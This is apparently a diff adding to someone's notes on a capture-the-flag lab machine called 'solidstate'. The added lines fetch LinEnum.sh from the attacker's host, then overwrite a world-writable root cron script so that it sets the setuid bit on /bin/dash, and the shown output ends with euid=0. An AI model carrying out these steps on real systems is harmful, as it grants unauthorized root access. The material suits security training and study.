@@ -2,6 +2,9 @@
 #Nmap full port -p-
 #SMTP Exploit
 #NC port 4555 root root default creds
+#Cron Job Escalation Priv
+#No GCC but DASH
+#Dash root setuid "euid" to priv ESC
 #
 
 1-Enumeration:
@@ -111,3 +114,58 @@
     Escape from Restricted Bash:
         https://book.hacktricks.xyz/network-services-pentesting/pentesting-ntp?q=How+do+you+escape+a+restricted+bash+shell+(rbash)?&ask=true
         ssh -t mindy@10.129.196.147 bash
+
+
+    Get LinEnum:
+        Kali:
+            └──╼ [★]$ python3 -m http.server 4443
+
+        Exploitable machine:
+            ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ wget -r http://10.10.14.108/LinEnum.sh
+
+
+        We found a fil /opt/tmp.py owned by ROOT its a python script:
+            ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -la /opt/tmp.py
+                -rwxrwxrwx 1 root root 133 Jan  1 14:52 /opt/tmp.py
+
+
+
+        We sill modify the "tmp.py" script:
+            We dont have "GCC" to exploit some uid binary but We have DASH enable its lighweigth than BASH:
+            ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ which dash
+            /bin/dash
+
+    
+    Exploit the tmp.py script replacing bash by dash to get root set uid "euid":
+
+        ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ nano /opt/tmp.py
+            #!/usr/bin/env python
+            import os
+            import sys
+            try:
+                os.system('chmod 4755 /bin/dash')
+            except:
+                sys.exit()
+
+    We need to wait until the Cron Job runs:
+
+        ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ date
+            Wed Jan  1 15:09:15 EST 2025
+        ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -la /bin/dash
+            -rwsr-xr-x 1 root root 124492 Jan 24  2017 /bin/dash
+        ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ date
+            Wed Jan  1 15:18:00 EST 2025
+        ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ dash
+            # id
+            uid=1001(mindy) gid=1001(mindy) euid=0(root) groups=1001(mindy)
+
+    We have the root uid:
+        euid=0(root
+
+
+
+
+
+
+
+
